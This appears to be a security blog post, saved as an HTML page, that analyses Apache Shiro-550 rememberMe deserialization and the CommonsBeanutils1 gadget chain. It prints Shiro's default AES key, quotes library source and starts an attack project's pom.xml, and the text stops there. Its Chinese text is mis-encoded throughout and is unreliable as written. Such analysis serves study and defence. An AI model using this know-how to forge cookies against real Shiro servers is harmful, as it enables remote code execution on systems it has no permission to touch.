<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CommonsBeanutils&amp;shiro550 | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="shrio 550 å‰è¨€ï¼šå¯¹PropertyUtils.getProperty()ä¸­çš„ä¸€äº›æµç¨‹è¿›è¡Œè°ƒè¯•ï¼Œåˆ†æå‡ºdescriptorsä¸­å€¼æ€ä¹ˆæ¥ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™äº›">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="CommonsBeanutils&amp;shiro550" />
<meta property="og:description" content="shrio 550 å‰è¨€ï¼šå¯¹PropertyUtils.getProperty()ä¸­çš„ä¸€äº›æµç¨‹è¿›è¡Œè°ƒè¯•ï¼Œåˆ†æå‡ºdescriptorsä¸­å€¼æ€ä¹ˆæ¥ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™äº›" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-11-28T20:01:23+08:00" />
<meta property="article:modified_time" content="2024-11-28T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CommonsBeanutils&amp;shiro550"/>
<meta name="twitter:description" content="shrio 550 å‰è¨€ï¼šå¯¹PropertyUtils.getProperty()ä¸­çš„ä¸€äº›æµç¨‹è¿›è¡Œè°ƒè¯•ï¼Œåˆ†æå‡ºdescriptorsä¸­å€¼æ€ä¹ˆæ¥ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™äº›"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CommonsBeanutils\u0026shiro550",
      "item": "https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CommonsBeanutils\u0026shiro550",
  "name": "CommonsBeanutils\u0026shiro550",
  "description": "shrio 550 å‰è¨€ï¼šå¯¹PropertyUtils.getProperty()ä¸­çš„ä¸€äº›æµç¨‹è¿›è¡Œè°ƒè¯•ï¼Œåˆ†æå‡ºdescriptorsä¸­å€¼æ€ä¹ˆæ¥ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™äº›",
  "keywords": [
    
  ],
  "articleBody": "shrio 550 å‰è¨€ï¼šå¯¹PropertyUtils.getProperty()ä¸­çš„ä¸€äº›æµç¨‹è¿›è¡Œè°ƒè¯•ï¼Œåˆ†æå‡ºdescriptorsä¸­å€¼æ€ä¹ˆæ¥ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™äº›å€¼ï¼Œä»è€Œæ˜ç™½pocä¸­è¿™æ®µä»£ç ä¸ºä»€ä¹ˆè¿™ä¹ˆè®¾ç½®BeanComparator beanComparator = new BeanComparator(\"outputProperties\");\nå…¶ä»–æ²¡ä»€ä¹ˆæ–°æ€è€ƒäº†ï¼Œæœ¬æ–‡ä¸»è¦æ˜¯åˆ†æCommonsBeanutilsé“¾çš„\nä»£ç ç¯å¢ƒ\nhttps://github.com/phith0n/JavaThings/tree/master/shirodemo\nçœ‹è¿™æ¡é“¾å­ä¸»è¦æ˜¯æƒ¦è®°ç€shrioï¼Œè¿™é‡Œå¤§æ¦‚è®°å½•ä¸‹shrioçš„æµç¨‹å§ï¼Œä¹Ÿä¸å¤æ‚ï¼Œå°±ä¸å•ç‹¬æ‹¿å‡ºæ¥è®²äº†\nCookieRememberMeManager#getRememberedSerializedIdentity\nè¿™é‡Œä¼šè·å–æˆ‘ä»¬rememberMeçš„å€¼è¿›è¡Œbase64è§£ç è¿”å›\nAbstractRememberMeManager#convertBytesToPrincipals()\nè¿™é‡Œä¼šå¯¹base64è§£å¯†åbyteså†è¿›è¡Œä¸€æ¬¡AESè§£å¯†ï¼Œè§£å¯†åå†è¿›è¡Œæˆ‘ä»¬ååºåˆ—åŒ–æ“ä½œï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦å¯†é’¥ï¼Œå°±æ˜¯è¿™é‡Œç”¨æ¥AESè§£å¯†çš„ï¼‰\ndecrypt()\nå¯ä»¥çœ‹åˆ°æ˜¯CBC PKCS5Paddingè¿™ç§æ¨¡å¼ï¼ŒAES 128ä½ çš„åŠ å¯†\nå¯†é’¥åœ¨è¿™ä¸ªç±»ä¸Šé¢å°±èƒ½çœ‹åˆ°\nprivate static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); deserialize()\næ³¨æ„è¿™é‡Œshiroä¸­ClassResolvingObjectInputStreamé‡å†™äº†ObjectInputStreamé‡Œçš„resolveClassæ–¹æ³•ï¼Œè¿™é‡Œé Java åŸç”Ÿçš„æ•°ç»„ä¼šååºåˆ—åŒ–å¤±è´¥\nè¿™å°±å¯¼è‡´åªè¦ cc é“¾åŒ…å«äº† Transformer æ•°ç»„, éƒ½ä¼šåˆ©ç”¨å¤±è´¥\nå‚è€ƒæ–‡ç«  (å†™çš„å¾ˆè¯¦ç»†): https://blog.zsxsoft.com/post/35\nShiro resovleClassä½¿ç”¨çš„æ˜¯ClassLoader.loadClass()è€ŒéClass.forName()ï¼Œè€ŒClassLoader.loadClassä¸æ”¯æŒè£…è½½æ•°ç»„ç±»å‹çš„classã€‚\n@Override protected Class\u003c?\u003e resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException { try { return ClassUtils.forName(osc.getName()); } catch (UnknownClassException e) { throw new ClassNotFoundException(\"Unable to load ObjectStreamClass [\" + osc + \"]: \", e); } } è¿™é‡ŒClassUtils.forNameå¯»æ‰¾ç±»çš„æ–¹å¼è·ŸObjectInputStreamçš„ä¸ä¸€æ ·\nä¸‹é¢è¿™ä¸ªæ•°ç»„ç±»å‹æœ€åä¼šåˆ°URLClassLoader#findClass()=\u003egetResource()\n[Lorg.apache.commons.collections.Transformer; è¿™é‡Œå¤–å±‚æ˜¯ä¸€ä¸ªforå¾ªç¯ï¼ŒæŠŠæ¯ä¸ªAppcalssloadä¼šæŸ¥æ‰¾ç±»çš„è·¯å¾„ï¼Œåœ¨getResource()å’Œè¦æŸ¥æ‰¾çš„Classè¿›è¡ŒåŒ…å«åˆ¤æ–­ï¼Œ\nè¿™é‡Œæˆ‘ä»¬ClassåŒ…å«metaIndexï¼Œæ‰ä¼šè¿›è¡Œåé¢çš„ä»£ç ï¼Œæ²¡æœ‰å°±è¿”å›false\næ­£å¸¸ç±»æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯æ•°ç»„ç±»å‹çš„ç±»è¯è·¯å¾„ä¸Šå¼€å¤´æ˜¯[Lï¼Œæ€ä¹ˆä¼šæœ‰å¯¹åº”çš„è·¯å¾„èƒ½æŸ¥æ‰¾åˆ°å‘¢ï¼Œæ‰€ä»¥æŠ¥é”™\nfor (int i = 0; (loader = getLoader(i)) != null; i++) { Resource res = loader.getResource(name, check); if (res != null) { return res; } } æ‰€ä»¥è¿™é‡ŒCCéœ€è¦æ”¹é€ æˆæ— æ•°ç»„çš„pocï¼Œæˆ‘è¿™é‡Œå°±ä¸è®°å½•ï¼Œä¹Ÿæ˜¯ç”¨çš„å‰é¢CCçš„æ–¹æ³•æ•´åˆçš„ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹ä¸‹é¢å‚è€ƒçš„è¿æ¥\nCommonsBeanutils1 CommonsBeanutils1æ˜¯ç”¨æ¥è§£å†³shiroæ— CCä¾èµ–çš„é—®é¢˜ï¼Œshiroè‡ªå¸¦CommonsBeanutilsä¾èµ–ï¼Œæ‰€ä»¥è¿™é“¾å­æœ‰å¯ä»¥å«shiroæ— ä¾èµ–é“¾\nç¯å¢ƒ\npom.xml æœ‰ç‚¹æ‚ï¼Œåæ­£è¿™ä¸ªèƒ½æ‰“\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ",
  "wordCount" : "3230",
  "inLanguage": "zh",
  "datePublished": "2024-11-28T20:01:23+08:00",
  "dateModified": "2024-11-28T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      CommonsBeanutils&amp;shiro550
    </h1>
    <div class="post-meta"><span title='2024-11-28 20:01:23 +0800 CST'>2024-11-28</span>&nbsp;Â·&nbsp;7 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#shrio-550" aria-label="shrio 550">shrio 550</a></li>
                    <li>
                        <a href="#commonsbeanutils1" aria-label="CommonsBeanutils1">CommonsBeanutils1</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e9%93%be" aria-label="åˆ©ç”¨é“¾"><strong>åˆ©ç”¨é“¾</strong></a></li>
                    <li>
                        <a href="#poc" aria-label="poc"><strong>poc</strong></a></li>
                    <li>
                        <a href="#gettargetpropertyinfo" aria-label="getTargetPropertyInfo()">getTargetPropertyInfo()</a><ul>
                            
                    <li>
                        <a href="#%e5%a5%bd%e6%88%8f%e5%bc%80%e5%9c%ba-properties%e7%94%b1%e6%9d%a5" aria-label="ã€*ã€‘å¥½æˆå¼€åœº Propertiesç”±æ¥">ã€*ã€‘å¥½æˆå¼€åœº Propertiesç”±æ¥</a></li></ul>
                    </li></ul>
                        
                    <li>
                        <a href="#%e6%80%bb%e7%bb%93-properties" aria-label="æ€»ç»“ Properties">æ€»ç»“ Properties</a></li></ul>
                    </li>
                    <li>
                        <a href="#shiro-721" aria-label="shiro 721">shiro 721</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h1 id="shrio-550">shrio 550<a hidden class="anchor" aria-hidden="true" href="#shrio-550">#</a></h1>
<blockquote>
<p>å‰è¨€ï¼šå¯¹<code>PropertyUtils.getProperty()</code>ä¸­çš„ä¸€äº›æµç¨‹è¿›è¡Œè°ƒè¯•ï¼Œåˆ†æå‡º<code>descriptors</code>ä¸­å€¼æ€ä¹ˆæ¥ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™äº›å€¼ï¼Œä»è€Œæ˜ç™½pocä¸­è¿™æ®µä»£ç ä¸ºä»€ä¹ˆè¿™ä¹ˆè®¾ç½®<code>BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);</code></p>
<p>å…¶ä»–æ²¡ä»€ä¹ˆæ–°æ€è€ƒäº†ï¼Œæœ¬æ–‡ä¸»è¦æ˜¯åˆ†æ<code>CommonsBeanutilsé“¾</code>çš„</p>
</blockquote>
<blockquote>
<p><strong>ä»£ç ç¯å¢ƒ</strong></p>
<p><a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
</blockquote>
<p>çœ‹è¿™æ¡é“¾å­ä¸»è¦æ˜¯æƒ¦è®°ç€shrioï¼Œè¿™é‡Œå¤§æ¦‚è®°å½•ä¸‹shrioçš„æµç¨‹å§ï¼Œä¹Ÿä¸å¤æ‚ï¼Œå°±ä¸å•ç‹¬æ‹¿å‡ºæ¥è®²äº†</p>
<p><code>CookieRememberMeManager#getRememberedSerializedIdentity</code></p>
<p>è¿™é‡Œä¼šè·å–æˆ‘ä»¬<code>rememberMe</code>çš„å€¼è¿›è¡Œbase64è§£ç è¿”å›</p>
<p><img loading="lazy" src="../images/image-20241129090601145.png" alt="image-20241129090601145"  />
</p>
<p><code>AbstractRememberMeManager#convertBytesToPrincipals()</code></p>
<p>è¿™é‡Œä¼šå¯¹<code>base64è§£å¯†åbytes</code>å†è¿›è¡Œä¸€æ¬¡<code>AESè§£å¯†</code>ï¼Œè§£å¯†åå†è¿›è¡Œæˆ‘ä»¬<code>ååºåˆ—åŒ–</code>æ“ä½œï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦<code>å¯†é’¥</code>ï¼Œå°±æ˜¯è¿™é‡Œç”¨æ¥AESè§£å¯†çš„ï¼‰</p>
<p><img loading="lazy" src="../images/image-20241129090742850.png" alt="image-20241129090742850"  />
</p>
<p><code>decrypt()</code></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯<code>CBC PKCS5Padding</code>è¿™ç§æ¨¡å¼ï¼Œ<code>AES 128ä½</code> çš„åŠ å¯†</p>
<p><img loading="lazy" src="../images/image-20241129091505177.png" alt="image-20241129091505177"  />
</p>
<p>å¯†é’¥åœ¨è¿™ä¸ªç±»ä¸Šé¢å°±èƒ½çœ‹åˆ°</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">DEFAULT_CIPHER_KEY_BYTES</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><code>deserialize()</code></p>
<p><img loading="lazy" src="../images/image-20241129091723921.png" alt="image-20241129091723921"  />
</p>
<p>æ³¨æ„è¿™é‡Œshiroä¸­<code>ClassResolvingObjectInputStream</code>é‡å†™äº†<code>ObjectInputStream</code>é‡Œçš„<code>resolveClass</code>æ–¹æ³•ï¼Œè¿™é‡Œ<strong>é Java åŸç”Ÿçš„æ•°ç»„ä¼šååºåˆ—åŒ–å¤±è´¥</strong></p>
<p>è¿™å°±å¯¼è‡´åªè¦ cc é“¾åŒ…å«äº† Transformer æ•°ç»„, éƒ½ä¼šåˆ©ç”¨å¤±è´¥</p>
<p>å‚è€ƒæ–‡ç«  (å†™çš„å¾ˆè¯¦ç»†): <a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
<blockquote>
<p><code>Shiro resovleClass</code>ä½¿ç”¨çš„æ˜¯ClassLoader.loadClass()è€ŒéClass.forName()ï¼Œè€Œ<code>ClassLoader.loadClassä¸æ”¯æŒè£…è½½æ•°ç»„ç±»å‹çš„class</code>ã€‚</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">protected</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">resolveClass</span><span class="p">(</span><span class="n">ObjectStreamClass</span><span class="w"> </span><span class="n">osc</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ClassUtils</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">osc</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">UnknownClassException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">(</span><span class="s">&#34;Unable to load ObjectStreamClass [&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">osc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;]: &#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241129161658502.png" alt="image-20241129161658502"  />
</p>
<p>è¿™é‡Œ<code>ClassUtils.forName</code>å¯»æ‰¾ç±»çš„æ–¹å¼è·Ÿ<code>ObjectInputStream</code>çš„ä¸ä¸€æ ·</p>
<p>ä¸‹é¢è¿™ä¸ª<code>æ•°ç»„ç±»å‹</code>æœ€åä¼šåˆ°<code>URLClassLoader#findClass()</code>=&gt;<code>getResource()</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">[</span><span class="n">Lorg</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">commons</span><span class="p">.</span><span class="na">collections</span><span class="p">.</span><span class="na">Transformer</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œå¤–å±‚æ˜¯ä¸€ä¸ª<code>forå¾ªç¯</code>ï¼ŒæŠŠ<code>æ¯ä¸ªAppcalssloadä¼šæŸ¥æ‰¾ç±»çš„è·¯å¾„</code>ï¼Œåœ¨<code>getResource()</code>å’Œ<code>è¦æŸ¥æ‰¾çš„Class</code>è¿›è¡Œ<code>åŒ…å«åˆ¤æ–­</code>ï¼Œ</p>
<p>è¿™é‡Œæˆ‘ä»¬<code>ClassåŒ…å«metaIndex</code>ï¼Œæ‰ä¼šè¿›è¡Œåé¢çš„ä»£ç ï¼Œæ²¡æœ‰å°±è¿”å›<code>false</code></p>
<p>æ­£å¸¸ç±»æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯<code>æ•°ç»„ç±»å‹çš„ç±»</code>è¯è·¯å¾„ä¸Šå¼€å¤´æ˜¯<code>[L</code>ï¼Œæ€ä¹ˆä¼šæœ‰å¯¹åº”çš„è·¯å¾„èƒ½æŸ¥æ‰¾åˆ°å‘¢ï¼Œæ‰€ä»¥æŠ¥é”™</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="n">loader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getLoader</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Resource</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">loader</span><span class="p">.</span><span class="na">getResource</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">check</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">res</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">res</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20241129160339205.png" alt="image-20241129160339205"  />
</p>
<p>æ‰€ä»¥è¿™é‡ŒCCéœ€è¦æ”¹é€ æˆæ— æ•°ç»„çš„pocï¼Œæˆ‘è¿™é‡Œå°±ä¸è®°å½•ï¼Œä¹Ÿæ˜¯ç”¨çš„å‰é¢CCçš„æ–¹æ³•æ•´åˆçš„ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹ä¸‹é¢å‚è€ƒçš„è¿æ¥</p>
<h1 id="commonsbeanutils1">CommonsBeanutils1<a hidden class="anchor" aria-hidden="true" href="#commonsbeanutils1">#</a></h1>
<p><code>CommonsBeanutils1</code>æ˜¯ç”¨æ¥è§£å†³shiroæ— CCä¾èµ–çš„é—®é¢˜ï¼Œshiroè‡ªå¸¦<code>CommonsBeanutils</code>ä¾èµ–ï¼Œæ‰€ä»¥è¿™é“¾å­æœ‰å¯ä»¥å«shiroæ— ä¾èµ–é“¾</p>
<p><strong>ç¯å¢ƒ</strong></p>
<p>pom.xml æœ‰ç‚¹æ‚ï¼Œåæ­£è¿™ä¸ªèƒ½æ‰“</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>com.govuln<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>shiroattack<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>1.0-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;name&gt;</span>shiroattack<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- FIXME change it to the project&#39;s website --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;url&gt;</span>http://www.example.com<span class="nt">&lt;/url&gt;</span>
</span></span><span class="line"><span class="cl">
